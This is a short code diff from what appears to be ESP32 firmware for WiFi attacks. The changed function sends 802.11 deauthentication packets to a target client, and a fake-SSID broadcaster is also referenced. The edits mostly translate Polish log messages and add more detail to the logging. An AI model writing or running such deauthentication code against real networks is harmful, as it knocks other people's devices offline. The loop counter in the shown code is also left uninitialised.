@@ -183,12 +183,12 @@ void broadcastFakeSSIDs(String ssidList[], int ssidCount, bool sound) {
 
 // Funkcja wysyłająca pakiety deauth do danego klienta
 bool send_deauth_packets(String &client_mac_str, int count, int delay_ms) {
-  logMessage("Deauth inited on target: "+ client_mac_str);
+  logMessage("Deauth active, paremeters: target: " + macToString(target_mac) + " client: " + client_mac_str + " count: " + String(count) + " delay: " + String(delay_ms));
   uint8_t client_mac[6];
   
   // Konwersja adresu MAC z string na tablicę bajtów
   if (!convert_mac_string_to_bytes(client_mac_str, client_mac)) {
-    logMessage("Błędny format adresu MAC klienta.");
+    logMessage("Client MAC input error.");
     return false;
   }
 
@@ -204,13 +204,12 @@ bool send_deauth_packets(String &client_mac_str, int count, int delay_ms) {
 
 
   for(uint16_t i; i<=count; i++){
-  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
-  if (result == ESP_OK) {
-    logMessage("Packet sent successfully.");
-    delay(delay_ms); // Delay between packets
-  } else {
-    logMessage("Error sending packet.");
-  }
+    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+    if (result == ESP_OK) {
+      delay(delay_ms); // Delay between packets
+    } else {
+      logMessage("Error sending packet. Counter: " + String(i) + " Error code: " + String(result));
+    }
   }
   return true;
 }
